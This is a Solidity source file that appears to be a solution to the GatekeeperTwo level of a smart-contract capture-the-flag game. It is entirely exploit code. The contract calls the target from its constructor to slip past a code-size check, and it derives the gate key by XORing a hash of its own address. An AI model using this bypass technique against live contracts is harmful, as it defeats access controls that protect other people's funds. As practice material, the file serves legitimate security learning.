pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract Exploiter {
    IGatekeeperTwo instance;

    constructor(IGatekeeperTwo _instance) {
        instance = _instance;
        bytes8 gateKey = computeGateKey();
        (bool success, ) = address(instance).call(abi.encodeWithSelector(IGatekeeperTwo.enter.selector, gateKey));
        require(success);
    }

    function computeGateKey() private view returns (bytes8) {
        address self = address(this);
        bytes32 hash = keccak256(abi.encodePacked(self));
        bytes8 hash8 = bytes8(hash);
        uint64 hashUint = uint64(hash8);
        return bytes8(hashUint ^ 0xFFFFFFFFFFFFFFFF);
    }
}